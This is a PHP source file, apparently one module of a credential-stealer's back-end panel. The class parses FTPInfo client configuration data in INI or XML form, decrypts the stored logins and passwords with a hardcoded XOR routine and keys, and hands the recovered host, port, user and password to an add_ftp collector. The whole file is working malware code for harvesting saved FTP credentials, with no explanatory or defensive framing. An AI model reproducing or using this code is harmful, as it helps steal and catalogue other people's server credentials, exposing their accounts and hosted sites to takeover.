<?php
class Module_ftpinfo extends Module_
	{
		protected function decrypt($Password, $KEY_)
		{
			if (!strlen($Password))
				return '';

			$decoded_password = hex2bin($Password);
			if ($decoded_password === false)
			{
				return '';
			}

			$decrypted_password = '';

			for ($i = 0; $i < strlen($decoded_password); $i++)
			{
				$decrypted_password .= chr(ord($decoded_password[$i]) ^ $i ^ ($i+1) ^ ord($KEY_[$i%strlen($KEY_)]));
			}

			return $decrypted_password;
		}
		
		
		protected function ProcessFTPInfo($Source)
		{
			$INI_ = parse_ini_string($Source, TRUE);
			if(!$INI_)
				return FALSE;
			
			foreach($INI_ as $Elements)
			{
				if(isset($Elements['Address']))
				{
					$Host = Assign_($Elements['Address']);
					$User = $this->decrypt($Elements['Login'], '19De^D$#');
					$Pass = $this->decrypt($Elements['Password'], 'qpdm()3-');
					$Port = Assign_($Elements['Port']);
					
					$this->add_ftp($this->append_port($Host, $Port), $User, $Pass);
				}
			}
			
			$INI_ = NULL;
		}
		
		protected function ProcessFTPInfo2($Source)
		{
			$XML_ = simplexml_load_string($Source);
			if(!$XML_)
				return FALSE;
			
			if(isset($XML_->Server->Data))
			{
				foreach($XML_->Server->Data as $Elements)
				{
					foreach($Elements as $Element)
					{
						if(isset($Element->Address))
						{
							$Host = Assign_($Element->Address);
							$User = $this->decrypt($Element->Login, '19De^D$#');
							$Pass = $this->decrypt($Element->Password, 'qpdm()3-');
							$Port = Assign_($Element->Port);
							
							$this->add_ftp($this->append_port($Host, $Port), $User, $Pass);
						}
					}
				}
			}
			
			$XML_ = NULL;
		}
		
		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
				case 0:
					$this->ProcessFTPInfo($Data);
					break;
				case 1:
					$this->ProcessFTPInfo2($Data);
					break;
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}
	